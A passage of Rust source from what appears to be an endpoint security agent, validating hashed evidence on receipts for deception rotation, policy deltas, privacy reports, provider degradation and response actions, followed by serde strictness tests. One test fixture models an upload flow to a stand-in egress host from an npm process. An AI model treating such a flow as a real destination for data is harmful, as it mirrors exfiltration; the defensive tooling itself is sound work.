        "deception rotation old plan root evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "newDeceptionPlanRoot",
        "deception rotation new plan root evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "oldDeceptionPlanHash",
        "deception rotation old plan hash evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "newDeceptionPlanHash",
        "deception rotation new plan hash evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "rotationReportHash",
        "deception rotation report hash evidence",
    )?;
    let dry_run = deception_rotation_dry_run_from_decision(decision)?;
    require_evidence_value_hash(
        evidence,
        "dryRun",
        dry_run.to_string(),
        "deception rotation dry-run evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "cleanupRemovedCount",
        "deception rotation cleanup removed count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "cleanupWouldRemoveCount",
        "deception rotation cleanup would-remove count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "cleanupMissingCount",
        "deception rotation cleanup missing count evidence",
    )?;
    let refused_count = evidence
        .iter()
        .find(|item| item.key == "cleanupRefusedCount")
        .ok_or_else(|| anyhow!("deception rotation cleanup refused count evidence is required"))?;
    require_evidence_hash_not_empty(
        refused_count,
        "deception rotation cleanup refused count evidence",
    )?;
    let zero_refused_hash = sha256(b"0").to_hex_prefixed();
    let refused_count_is_zero = hex_strings_match(
        zero_refused_hash.as_str(),
        refused_count.value_hash.as_str(),
    );
    if decision.passed != refused_count_is_zero {
        return Err(anyhow!(
            "deception rotation cleanup refused count evidence hash must match signed pass state"
        ));
    }
    require_nonempty_hashed_evidence(
        evidence,
        "materializationCreatedCount",
        "deception rotation materialization created count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "materializationSkippedCount",
        "deception rotation materialization skipped count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "deregisteredArtifactCount",
        "deception rotation deregistered artifact count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "registeredArtifactCount",
        "deception rotation registered artifact count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "remainingRegisteredArtifactCount",
        "deception rotation remaining registered artifact count evidence",
    )?;
    let rotation_id = deception_rotation_id_from_evidence(
        evidence,
        actor.endpoint_id.as_str(),
        policy.policy_hash.as_str(),
    )?;
    if signed_rotation_id != Some(rotation_id.as_str()) {
        return Err(anyhow!(
            "deception rotation id must match signed plan root, plan, report, mode, count, and registry evidence"
        ));
    }
    Ok(())
}

fn deception_rotation_dry_run_from_decision(decision: &EndpointDecisionRecord) -> Result<bool> {
    let title = decision
        .title
        .as_deref()
        .ok_or_else(|| anyhow!("deception rotation title is required"))?;
    match title {
        "Endpoint deception rotation dry run planned" => Ok(true),
        "Endpoint deception rotation executed" => Ok(false),
        _ => Err(anyhow!("deception rotation title is invalid")),
    }
}

fn require_policy_delta_evidence(
    evidence: &[EndpointReceiptEvidence],
    decision: &EndpointDecisionRecord,
    actor: &EndpointDecisionActor,
    policy: &EndpointPolicySnapshot,
    graph_slice_id: Option<&str>,
    root_node_id: Option<&str>,
) -> Result<()> {
    let policy_delta_id = decision
        .finding_id
        .as_deref()
        .ok_or_else(|| anyhow!("policy delta signed id is required"))?;
    let rule_id = decision
        .rule_id
        .as_deref()
        .ok_or_else(|| anyhow!("policy delta rule id is required"))?;
    let graph_slice_id =
        graph_slice_id.ok_or_else(|| anyhow!("policy delta graph slice id is required"))?;
    let root_node_id =
        root_node_id.ok_or_else(|| anyhow!("policy delta root node id is required"))?;
    let operation = policy_delta_operation_from_title(decision)?;
    require_evidence_value_hash(
        evidence,
        "operation",
        operation,
        "policy delta operation evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "policyDeltaId",
        policy_delta_id,
        "policy delta id evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "stagedDetectionId",
        "policy delta staged detection evidence",
    )?;
    require_nonempty_hashed_evidence(evidence, "stage", "policy delta stage evidence")?;
    require_policy_delta_stage_action_evidence(evidence, &decision.action)?;
    require_nonempty_hashed_evidence(
        evidence,
        "generatedAt",
        "policy delta generated-at evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "artifactHash",
        "policy delta artifact hash evidence",
    )?;
    require_nonempty_hashed_evidence(evidence, "simulationId", "policy delta simulation evidence")?;
    require_evidence_value_hash(
        evidence,
        "graphSliceId",
        graph_slice_id,
        "policy delta graph slice evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "rootNodeId",
        root_node_id,
        "policy delta root node evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "sourceAffectedIdentityContext",
        "policy delta source affected identity context evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "sourceAffectedToolContext",
        "policy delta source affected tool context evidence",
    )?;
    let expected_policy_delta_id = policy_delta_id_from_evidence(
        evidence,
        actor.endpoint_id.as_str(),
        rule_id,
        &decision.action,
    )?;
    if policy_delta_id != expected_policy_delta_id {
        return Err(anyhow!(
            "policy delta id must match signed endpoint, rule, action, staged source, generation time, simulation, and graph evidence"
        ));
    }
    require_policy_delta_operation_evidence(evidence, operation, policy)?;
    Ok(())
}

fn require_policy_delta_stage_action_evidence(
    evidence: &[EndpointReceiptEvidence],
    action: &EndpointDecisionAction,
) -> Result<()> {
    let stage_hash = evidence_value_hash(evidence, "stage", "policy delta stage evidence")?;
    let Some(stage) = policy_delta_stage_from_hash(stage_hash) else {
        return Err(anyhow!(
            "policy delta stage evidence must be observe, audit, warn, limited_block, or full_block"
        ));
    };
    if matches!(stage, "limited_block" | "full_block")
        && !policy_delta_receipt_enforcement_action_supported(action)
    {
        return Err(anyhow!(
            "policy delta enforcement stage requires a rollback-capable policy action"
        ));
    }
    Ok(())
}

fn policy_delta_stage_from_hash(stage_hash: &str) -> Option<&'static str> {
    ["observe", "audit", "warn", "limited_block", "full_block"]
        .into_iter()
        .find(|stage| {
            let expected_hash = sha256(stage.as_bytes()).to_hex_prefixed();
            hex_strings_match(expected_hash.as_str(), stage_hash)
        })
}

fn policy_delta_receipt_enforcement_action_supported(action: &EndpointDecisionAction) -> bool {
    matches!(
        action,
        EndpointDecisionAction::Block
            | EndpointDecisionAction::RestrictEgress
            | EndpointDecisionAction::SuspendProcessTree
            | EndpointDecisionAction::QuarantineFile
            | EndpointDecisionAction::RevokeGrant
            | EndpointDecisionAction::DisablePersistence
    )
}

fn policy_delta_operation_from_title(decision: &EndpointDecisionRecord) -> Result<&str> {
    let title = decision
        .title
        .as_deref()
        .ok_or_else(|| anyhow!("policy delta operation title is required"))?;
    let Some(operation) = title.strip_prefix("Endpoint staged policy delta ") else {
        return Err(anyhow!("policy delta operation title is invalid"));
    };
    match operation {
        "generated" | "applied" => Ok(operation),
        _ => Err(anyhow!("policy delta operation title is invalid")),
    }
}

fn require_policy_delta_operation_evidence(
    evidence: &[EndpointReceiptEvidence],
    operation: &str,
    policy: &EndpointPolicySnapshot,
) -> Result<()> {
    let has_previous_policy_hash = evidence.iter().any(|item| item.key == "previousPolicyHash");
    let has_new_policy_hash = evidence.iter().any(|item| item.key == "newPolicyHash");
    let has_backup_path = evidence.iter().any(|item| item.key == "backupPath");

    match operation {
        "generated" => {
            if has_previous_policy_hash || has_new_policy_hash || has_backup_path {
                return Err(anyhow!(
                    "policy delta generated receipt must not include apply evidence"
                ));
            }
        }
        "applied" => {
            require_nonempty_hashed_evidence(
                evidence,
                "previousPolicyHash",
                "policy delta applied previous policy evidence",
            )?;
            require_evidence_value_hash(
                evidence,
                "newPolicyHash",
                policy.policy_hash.as_str(),
                "policy delta applied new policy evidence",
            )?;
            require_nonempty_hashed_evidence(
                evidence,
                "backupPath",
                "policy delta applied backup evidence",
            )?;
        }
        _ => unreachable!("policy delta operation already validated"),
    }

    Ok(())
}

fn policy_delta_id_from_evidence(
    evidence: &[EndpointReceiptEvidence],
    endpoint_id: &str,
    rule_id: &str,
    action: &EndpointDecisionAction,
) -> Result<String> {
    Ok(stable_id(
        "policy_delta",
        [
            endpoint_id,
            rule_id,
            action.as_str(),
            evidence_value_hash(
                evidence,
                "stagedDetectionId",
                "policy delta staged detection evidence",
            )?,
            evidence_value_hash(evidence, "stage", "policy delta stage evidence")?,
            evidence_value_hash(
                evidence,
                "generatedAt",
                "policy delta generated-at evidence",
            )?,
            evidence_value_hash(evidence, "simulationId", "policy delta simulation evidence")?,
            evidence_value_hash(
                evidence,
                "graphSliceId",
                "policy delta graph slice evidence",
            )?,
            evidence_value_hash(evidence, "rootNodeId", "policy delta root node evidence")?,
            evidence_value_hash(
                evidence,
                "sourceAffectedIdentityContext",
                "policy delta source affected identity context evidence",
            )?,
            evidence_value_hash(
                evidence,
                "sourceAffectedToolContext",
                "policy delta source affected tool context evidence",
            )?,
        ],
    ))
}

fn require_policy_delta_graph_reference(graph: &EndpointGraphReference) -> Result<()> {
    let root_node_id = graph
        .process_node_id
        .as_deref()
        .ok_or_else(|| anyhow!("policy delta root node id is required"))?;
    if !graph.node_ids.iter().any(|node_id| node_id == root_node_id) {
        return Err(anyhow!(
            "policy delta root node reference must be included in graph node ids"
        ));
    }
    Ok(())
}

fn require_privacy_report_evidence(
    evidence: &[EndpointReceiptEvidence],
    privacy_report_id: Option<&str>,
) -> Result<()> {
    let privacy_report_id =
        privacy_report_id.ok_or_else(|| anyhow!("privacy report signed id is required"))?;
    require_evidence_value_hash(
        evidence,
        "privacyReportId",
        privacy_report_id,
        "privacy report id evidence",
    )?;
    require_nonempty_hashed_evidence(evidence, "privacyMode", "privacy report mode evidence")?;
    require_boolean_hashed_evidence(
        evidence,
        "rawArtifactUploadPermitted",
        "privacy report raw artifact permission evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "observationCount",
        "privacy report observation count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "fieldCount",
        "privacy report field count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "hashOnlyCount",
        "privacy report hash-only count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "metadataOnlyCount",
        "privacy report metadata-only count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "redactedCount",
        "privacy report redacted count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "rawSuppressedCount",
        "privacy report raw suppressed count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "localOnlyCount",
        "privacy report local-only count evidence",
    )?;
    let raw_artifact_upload_permitted_hash = evidence_value_hash(
        evidence,
        "rawArtifactUploadPermitted",
        "privacy report raw artifact permission evidence",
    )?;
    let true_hash = sha256(b"true").to_hex_prefixed();
    if hex_strings_match(raw_artifact_upload_permitted_hash, true_hash.as_str()) {
        require_nonempty_hashed_evidence(
            evidence,
            "rawArtifactApprovalId",
            "privacy report raw artifact approval id evidence",
        )?;
        require_nonempty_hashed_evidence(
            evidence,
            "rawArtifactApprovalReasonHash",
            "privacy report raw artifact approval reason hash evidence",
        )?;
    }
    let expected_privacy_report_id = telemetry_privacy_report_id_from_evidence(evidence)?;
    if privacy_report_id != expected_privacy_report_id {
        return Err(anyhow!(
            "privacy report id must match signed mode and count evidence"
        ));
    }
    Ok(())
}

fn require_provider_degradation_evidence(
    evidence: &[EndpointReceiptEvidence],
    signed_degradation_id: Option<&str>,
    rule_id: Option<&str>,
    actor: &EndpointDecisionActor,
    policy: &EndpointPolicySnapshot,
    sensor_state: &EndpointSensorState,
) -> Result<()> {
    let signed_degradation_id = signed_degradation_id
        .ok_or_else(|| anyhow!("provider degradation signed id is required"))?;
    let rule_id = rule_id.ok_or_else(|| anyhow!("provider degradation rule id is required"))?;
    let provider_id = rule_id
        .strip_prefix("endpoint.provider_degradation.")
        .ok_or_else(|| anyhow!("provider degradation rule id must include provider id"))?;
    let provider = sensor_state
        .providers
        .iter()
        .find(|provider| provider.provider_id == provider_id)
        .ok_or_else(|| {
            anyhow!("provider degradation provider id is not present in sensor state")
        })?;
    let provider_kind = camel_debug_to_snake(format!("{:?}", provider.provider_kind).as_str());
    let reasons = provider.degradation_reasons.join("|");

    require_evidence_value_hash(
        evidence,
        "providerId",
        provider.provider_id.as_str(),
        "provider degradation provider id evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "providerKind",
        provider_kind.as_str(),
        "provider degradation provider kind evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "installed",
        provider.installed.to_string(),
        "provider degradation installed evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "active",
        provider.active.to_string(),
        "provider degradation active evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "healthy",
        provider.healthy.to_string(),
        "provider degradation healthy evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "degraded",
        provider.degraded.to_string(),
        "provider degradation degraded evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "degradationReasons",
        reasons,
        "provider degradation reasons evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "droppedEventCount",
        provider.dropped_event_count.to_string(),
        "provider degradation dropped-event count evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "deadlineMissCount",
        provider.deadline_miss_count.to_string(),
        "provider degradation deadline-miss count evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "fullDiskAccess",
        endpoint_provider_full_disk_access_evidence_value(provider.full_disk_access),
        "provider degradation full-disk-access evidence",
    )?;
    let expected_degradation_id = provider_degradation_id_from_evidence(
        evidence,
        actor.endpoint_id.as_str(),
        policy.policy_hash.as_str(),
    )?;
    if signed_degradation_id != expected_degradation_id {
        return Err(anyhow!(
            "provider degradation id must match signed endpoint, policy, provider state, reason, and counter evidence"
        ));
    }
    Ok(())
}

fn require_response_execution_status_evidence(
    decision: &EndpointDecisionRecord,
    evidence: &[EndpointReceiptEvidence],
) -> Result<()> {
    let expected_status = response_execution_status_from_decision(decision)?;
    require_evidence_value_hash(
        evidence,
        "executionStatus",
        expected_status,
        "execution status evidence",
    )
}

fn response_execution_status_from_decision(
    decision: &EndpointDecisionRecord,
) -> Result<&'static str> {
    let Some(title) = decision.title.as_deref() else {
        return Err(anyhow!("execution status title is required"));
    };
    let expected = match title {
        "Endpoint response action executed" => "succeeded",
        "Endpoint response action failed" => "failed",
        "Endpoint response action partially executed" => "partial",
        "Endpoint response action expired" => "expired",
        "Endpoint response action cancelled" => "cancelled",
        "Endpoint response action rolled back" => "rolled_back",
        _ => return Err(anyhow!("execution status title is invalid")),
    };
    let expected_passed = expected == "succeeded";
    if decision.passed != expected_passed {
        return Err(anyhow!("execution status passed flag is inconsistent"));
    }
    Ok(expected)
}

fn require_response_rollback_status_evidence(
    decision: &EndpointDecisionRecord,
    evidence: &[EndpointReceiptEvidence],
) -> Result<()> {
    if decision.title.as_deref() != Some("Endpoint response rollback executed") {
        return Err(anyhow!("rollback status title is invalid"));
    }
    if !decision.passed {
        return Err(anyhow!("rollback status passed flag is inconsistent"));
    }
    require_evidence_value_hash(
        evidence,
        "rollbackStatus",
        "succeeded",
        "rollback status evidence",
    )
}

fn require_response_acknowledgement_status_evidence(
    decision: &EndpointDecisionRecord,
    evidence: &[EndpointReceiptEvidence],
) -> Result<()> {
    let expected_status = response_acknowledgement_status_from_decision(decision)?;
    require_evidence_value_hash(
        evidence,
        "acknowledgedStatus",
        expected_status,
        "acknowledgement status evidence",
    )
}

fn response_acknowledgement_status_from_decision(
    decision: &EndpointDecisionRecord,
) -> Result<&str> {
    let Some(title) = decision.title.as_deref() else {
        return Err(anyhow!("acknowledgement status title is required"));
    };
    let Some(status) = title.strip_prefix("Endpoint response execution acknowledged: ") else {
        return Err(anyhow!("acknowledgement status title is invalid"));
    };
    match status {
        "succeeded" | "failed" | "partial" | "expired" | "cancelled" | "rolled_back" => {}
        _ => return Err(anyhow!("acknowledgement status title is invalid")),
    }
    if !decision.passed {
        return Err(anyhow!(
            "acknowledgement status passed flag is inconsistent"
        ));
    }
    Ok(status)
}

fn require_response_acknowledged_by_evidence(
    actor: &EndpointDecisionActor,
    evidence: &[EndpointReceiptEvidence],
) -> Result<()> {
    let acknowledged_by = actor
        .agent_id
        .as_deref()
        .ok_or_else(|| anyhow!("acknowledged-by actor identity is required"))?;
    require_nonempty(acknowledged_by, "acknowledged-by actor identity")?;
    require_evidence_value_hash(
        evidence,
        "acknowledgedBy",
        acknowledged_by,
        "acknowledged-by evidence",
    )
}

fn require_response_control_acknowledgement_evidence(
    evidence: &[EndpointReceiptEvidence],
) -> Result<()> {
    let has_control_evidence = evidence.iter().any(|item| item.key.starts_with("control"));
    if !has_control_evidence {
        return Ok(());
    }

    require_nonempty_hashed_evidence(
        evidence,
        "controlResponseActionId",
        "control acknowledgement response action id evidence",
    )?;
    require_control_target_kind_evidence(evidence)?;
    require_nonempty_hashed_evidence(
        evidence,
        "controlTargetId",
        "control acknowledgement target id evidence",
    )?;
    require_control_ack_token_hash_evidence(evidence)?;
    require_control_ack_status_evidence(evidence)?;

    for (key, field_name) in [
        (
            "controlDeliveryId",
            "control acknowledgement delivery id evidence",
        ),
        (
            "controlResultingState",
            "control acknowledgement resulting state evidence",
        ),
    ] {
        if evidence.iter().any(|item| item.key == key) {
            require_nonempty_hashed_evidence(evidence, key, field_name)?;
        }
    }

    Ok(())
}

fn require_control_ack_token_hash_evidence(evidence: &[EndpointReceiptEvidence]) -> Result<()> {
    let Some(item) = evidence
        .iter()
        .find(|item| item.key == "controlAckTokenHash")
    else {
        return Err(anyhow!(
            "control acknowledgement token hash evidence is required"
        ));
    };
    if item.redaction_class != EndpointEvidenceRedactionClass::HashOnly || item.raw_value.is_some()
    {
        return Err(anyhow!(
            "control acknowledgement token hash evidence must be hash-only"
        ));
    }
    require_evidence_hash_not_empty(item, "control acknowledgement token hash evidence")
}

fn require_control_ack_status_evidence(evidence: &[EndpointReceiptEvidence]) -> Result<()> {
    let Some(item) = evidence.iter().find(|item| item.key == "controlAckStatus") else {
        return Err(anyhow!(
            "control acknowledgement status evidence is required"
        ));
    };
    require_evidence_hash_not_empty(item, "control acknowledgement status evidence")?;
    let allowed_statuses = [
        "acknowledged",
        "rejected",
        "failed",
        "expired",
        "rolled_back",
    ];
    if allowed_statuses.iter().any(|status| {
        let expected_hash = sha256(status.as_bytes()).to_hex_prefixed();
        hex_strings_match(expected_hash.as_str(), item.value_hash.as_str())
    }) {
        return Ok(());
    }
    Err(anyhow!(
        "control acknowledgement status evidence must be acknowledged, rejected, failed, expired, or rolled_back"
    ))
}

fn require_control_target_kind_evidence(evidence: &[EndpointReceiptEvidence]) -> Result<()> {
    let Some(item) = evidence.iter().find(|item| item.key == "controlTargetKind") else {
        return Err(anyhow!(
            "control acknowledgement target kind evidence is required"
        ));
    };
    require_evidence_hash_not_empty(item, "control acknowledgement target kind evidence")?;
    let allowed_target_kinds = [
        "endpoint",
        "runtime",
        "session",
        "principal",
        "grant",
        "swarm",
        "project",
    ];
    if allowed_target_kinds.iter().any(|target_kind| {
        let expected_hash = sha256(target_kind.as_bytes()).to_hex_prefixed();
        hex_strings_match(expected_hash.as_str(), item.value_hash.as_str())
    }) {
        return Ok(());
    }
    Err(anyhow!(
        "control acknowledgement target kind evidence must be endpoint, runtime, session, principal, grant, swarm, or project"
    ))
}

fn require_nonempty_hashed_evidence(
    evidence: &[EndpointReceiptEvidence],
    key: &str,
    field_name: &str,
) -> Result<()> {
    let Some(item) = evidence.iter().find(|item| item.key == key) else {
        return Err(anyhow!("{field_name} is required"));
    };
    require_evidence_hash_not_empty(item, field_name)
}

fn evidence_value_hash<'a>(
    evidence: &'a [EndpointReceiptEvidence],
    key: &str,
    field_name: &str,
) -> Result<&'a str> {
    let Some(item) = evidence.iter().find(|item| item.key == key) else {
        return Err(anyhow!("{field_name} is required"));
    };
    require_evidence_hash_not_empty(item, field_name)?;
    Ok(item.value_hash.as_str())
}

fn require_boolean_hashed_evidence(
    evidence: &[EndpointReceiptEvidence],
    key: &str,
    field_name: &str,
) -> Result<()> {
    let Some(item) = evidence.iter().find(|item| item.key == key) else {
        return Err(anyhow!("{field_name} is required"));
    };
    require_evidence_hash_not_empty(item, field_name)?;
    let true_hash = sha256(b"true").to_hex_prefixed();
    let false_hash = sha256(b"false").to_hex_prefixed();
    if !hex_strings_match(true_hash.as_str(), item.value_hash.as_str())
        && !hex_strings_match(false_hash.as_str(), item.value_hash.as_str())
    {
        return Err(anyhow!("{field_name} must be boolean"));
    }
    Ok(())
}

fn require_evidence_hash_not_empty(item: &EndpointReceiptEvidence, field_name: &str) -> Result<()> {
    let empty_value_hash = sha256(b"").to_hex_prefixed();
    if hex_strings_match(empty_value_hash.as_str(), item.value_hash.as_str()) {
        return Err(anyhow!("{field_name} must not be empty"));
    }
    Ok(())
}

fn require_response_action(action: &EndpointDecisionAction) -> Result<()> {
    if matches!(
        action,
        EndpointDecisionAction::RestrictEgress
            | EndpointDecisionAction::SuspendProcessTree
            | EndpointDecisionAction::TerminateProcessTree
            | EndpointDecisionAction::QuarantineFile
            | EndpointDecisionAction::RevokeGrant
            | EndpointDecisionAction::DisablePersistence
            | EndpointDecisionAction::CollectEvidence
    ) {
        return Ok(());
    }

    Err(anyhow!(
        "response action must be a bounded local response action"
    ))
}

fn require_response_action_for_family(
    family: &EndpointDecisionReceiptFamily,
    decision: &EndpointDecisionRecord,
) -> Result<()> {
    require_response_action(&decision.action)?;
    if decision.action != EndpointDecisionAction::TerminateProcessTree {
        return Ok(());
    }

    if family == &EndpointDecisionReceiptFamily::ResponseRequest
        && response_request_dry_run_from_decision(decision)?
    {
        return Ok(());
    }

    Err(anyhow!(
        "terminate_process_tree response proofs are limited to dry-run response requests"
    ))
}

fn require_provider_last_seen_consistency(
    provider: &EndpointProviderState,
    captured_at: &DateTime<Utc>,
) -> Result<()> {
    if (provider.active || provider.healthy) && provider.last_seen.is_none() {
        return Err(anyhow!(
            "sensor provider {} last seen timestamp is required when provider is active or healthy",
            provider.provider_id
        ));
    }
    if let Some(last_seen) = provider.last_seen.as_ref() {
        if last_seen > captured_at {
            return Err(anyhow!(
                "sensor provider {} last seen timestamp is after receipt capture time",
                provider.provider_id
            ));
        }
    }
    Ok(())
}

fn require_provider_degradation_consistency(provider: &EndpointProviderState) -> Result<()> {
    let has_degradation_signal = !provider.installed
        || !provider.active
        || !provider.healthy
        || provider.dropped_event_count > 0
        || provider.deadline_miss_count > 0
        || provider.full_disk_access == Some(false);

    if has_degradation_signal && !provider.degraded {
        return Err(anyhow!(
            "sensor provider {} must be marked degraded when installed, active, healthy, event-loss, deadline, or full-disk-access evidence indicates degraded protection",
            provider.provider_id
        ));
    }
    Ok(())
}

fn require_response_actor_context(actor: &EndpointDecisionActor) -> Result<()> {
    let has_actor_context = [
        actor.user_id.as_deref(),
        actor.session_id.as_deref(),
        actor.agent_id.as_deref(),
        actor.workload_id.as_deref(),
        actor.approval_id.as_deref(),
    ]
    .into_iter()
    .flatten()
    .any(|value| !value.trim().is_empty());

    if has_actor_context {
        return Ok(());
    }
    Err(anyhow!("response actor context is required"))
}

fn require_response_actor_evidence(
    actor: &EndpointDecisionActor,
    evidence: &[EndpointReceiptEvidence],
) -> Result<()> {
    require_evidence_value_hash(
        evidence,
        "actorHash",
        endpoint_decision_actor_content_hash(actor),
        "response actor evidence",
    )
}

fn hex_strings_match(expected: &str, actual: &str) -> bool {
    trim_hex_prefix(expected).eq_ignore_ascii_case(trim_hex_prefix(actual))
}

fn trim_hex_prefix(value: &str) -> &str {
    value
        .trim()
        .strip_prefix("0x")
        .or_else(|| value.trim().strip_prefix("0X"))
        .unwrap_or_else(|| value.trim())
}

fn camel_debug_to_snake(value: &str) -> String {
    let mut out = String::new();
    for (idx, ch) in value.chars().enumerate() {
        if ch.is_ascii_uppercase() {
            if idx > 0 {
                out.push('_');
            }
            out.push(ch.to_ascii_lowercase());
        } else {
            out.push(ch);
        }
    }
    out
}

fn reconstruct_path(from: &str, to: &str, previous: &BTreeMap<String, String>) -> Vec<String> {
    let mut path = vec![to.to_string()];
    let mut cursor = to;
    while let Some(prev) = previous.get(cursor) {
        path.push(prev.clone());
        if prev == from {
            break;
        }
        cursor = prev;
    }
    path.reverse();
    path
}

#[cfg(test)]
mod tests {
    #![allow(clippy::expect_used, clippy::unwrap_used)]

    use std::sync::atomic::{AtomicU64, Ordering};
    use std::time::{SystemTime, UNIX_EPOCH};

    use super::*;

    static TEMP_ROOT_COUNTER: AtomicU64 = AtomicU64::new(0);

    fn observation(event: EndpointEvent) -> EndpointObservation {
        EndpointObservation {
            observation_id: stable_id("test", ["obs", event_name(&event)]),
            timestamp: Utc::now(),
            host_id: Some("host-1".to_string()),
            user_id: Some("alice".to_string()),
            session_id: Some("session-1".to_string()),
            process: EndpointProcess {
                pid: Some(42),
                process_guid: Some("proc-42".to_string()),
                image: Some("/usr/bin/npm".to_string()),
                command_line: Some("npm install".to_string()),
                signing: CodeSignatureStatus {
                    trust: SignatureTrust::Notarized,
                    notarized: Some(true),
                    ..CodeSignatureStatus::default()
                },
                ..EndpointProcess::default()
            },
            event,
            metadata: BTreeMap::new(),
        }
    }

    fn event_name(event: &EndpointEvent) -> &'static str {
        match event {
            EndpointEvent::PackageScript { .. } => "script",
            EndpointEvent::ProcessExec { .. } => "exec",
            EndpointEvent::FileAccess { .. } => "file",
            EndpointEvent::NetworkFlow { .. } => "network",
            EndpointEvent::DnsLookup { .. } => "dns",
            EndpointEvent::CredentialAccess { .. } => "credential",
            _ => "other",
        }
    }

    fn assert_unknown_field_rejected<T>(mut value: serde_json::Value, field: &str)
    where
        T: serde::de::DeserializeOwned,
    {
        value[field] = serde_json::Value::String("must not be ignored".to_string());
        let Err(err) = serde_json::from_value::<T>(value) else {
            panic!("expected unknown field {field} to be rejected");
        };
        let err = err.to_string();
        assert!(
            err.contains("unknown field") && err.contains(field),
            "expected unknown field {field} to be rejected, got {err}"
        );
    }

    fn write_jsonl_value(path: &Path, value: &serde_json::Value) {
        let mut bytes = serde_json::to_vec(value).unwrap();
        bytes.push(b'\n');
        fs::write(path, bytes).unwrap();
    }

    fn assert_anyhow_error_mentions_unknown_field(err: anyhow::Error, field: &str) {
        let chain = err
            .chain()
            .map(std::string::ToString::to_string)
            .collect::<Vec<_>>()
            .join("\n");
        assert!(
            chain.contains("unknown field") && chain.contains(field),
            "expected unknown field {field} to be rejected, got {chain}"
        );
    }

    #[test]
    fn endpoint_runtime_identity_deserialization_rejects_unknown_fields() {
        let signing = CodeSignatureStatus {
            trust: SignatureTrust::Signed,
            team_id: Some("TEAMID1234".to_string()),
            signing_id: Some("com.example.tool".to_string()),
            cdhash: Some("actual-cdhash".to_string()),
            expected_cdhash: Some("expected-cdhash".to_string()),
            notarized: Some(true),
        };

        assert_unknown_field_rejected::<CodeSignatureStatus>(
            serde_json::to_value(&signing).unwrap(),
            "shadowCdhash",
        );

        let process = EndpointProcess {
            pid: Some(42),
            ppid: Some(7),
            process_guid: Some("proc-guid-42".to_string()),
            parent_process_guid: Some("proc-guid-7".to_string()),
            image: Some("/usr/local/bin/developer-tool".to_string()),
            command_line: Some("developer-tool build".to_string()),
            cwd: Some("/repo".to_string()),
            signing,
        };

        assert_unknown_field_rejected::<EndpointProcess>(
            serde_json::to_value(&process).unwrap(),
            "shadowProcessGuid",
        );

        let mut process_with_unknown_signing = serde_json::to_value(&process).unwrap();
        process_with_unknown_signing["signing"]["shadowCdhash"] =
            serde_json::Value::String("must not be ignored".to_string());
        let err = serde_json::from_value::<EndpointProcess>(process_with_unknown_signing)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowCdhash"),
            "expected unknown nested signing field to be rejected, got {err}"
        );
    }

    #[test]
    fn endpoint_observation_and_causal_graph_deserialization_reject_unknown_fields() {
        let observation = observation(EndpointEvent::NetworkFlow {
            host: "egress.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://egress.example.invalid/upload".to_string()),
        });

        assert_unknown_field_rejected::<EndpointObservation>(
            serde_json::to_value(&observation).unwrap(),
            "shadowObservationId",
        );

        let mut recorder = CausalGraphRecorder::new();
        recorder.record_observation(&observation);
        let graph = recorder.into_graph();

        assert_unknown_field_rejected::<CausalGraph>(
            serde_json::to_value(&graph).unwrap(),
            "shadowNodeCount",
        );
        let node = graph
            .nodes
            .values()
            .next()
            .unwrap_or_else(|| panic!("expected graph node for strict serde regression"));
        assert_unknown_field_rejected::<CausalNode>(
            serde_json::to_value(node).unwrap(),
            "shadowLabel",
        );
        let edge = graph
            .edges
            .first()
            .unwrap_or_else(|| panic!("expected graph edge for strict serde regression"));
        assert_unknown_field_rejected::<CausalEdge>(
            serde_json::to_value(edge).unwrap(),
            "shadowObservationId",
        );
    }

    #[test]
    fn endpoint_receipt_evidence_deserialization_requires_redaction_class() {
        let missing_redaction_class = serde_json::json!({
            "key": "policyHash",
            "valueHash": sha256(b"policy@1").to_hex_prefixed()
        });
        let err = serde_json::from_value::<EndpointReceiptEvidence>(missing_redaction_class)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("redactionClass"),
            "expected missing redactionClass to be rejected, got {err}"
        );

        let explicit_redaction_class = serde_json::json!({
            "key": "policyHash",
            "valueHash": sha256(b"policy@1").to_hex_prefixed(),
            "redactionClass": "hash_only"
        });
        let evidence = serde_json::from_value::<EndpointReceiptEvidence>(explicit_redaction_class)
            .unwrap_or_else(|err| panic!("explicit redaction class should deserialize: {err}"));
        assert_eq!(
            evidence.redaction_class,
            EndpointEvidenceRedactionClass::HashOnly
        );
        assert!(evidence.raw_value.is_none());

        let unknown_evidence_field = serde_json::json!({
            "key": "policyHash",
            "valueHash": sha256(b"policy@1").to_hex_prefixed(),
            "redactionClass": "hash_only",
            "rawSecret": "must not be ignored"
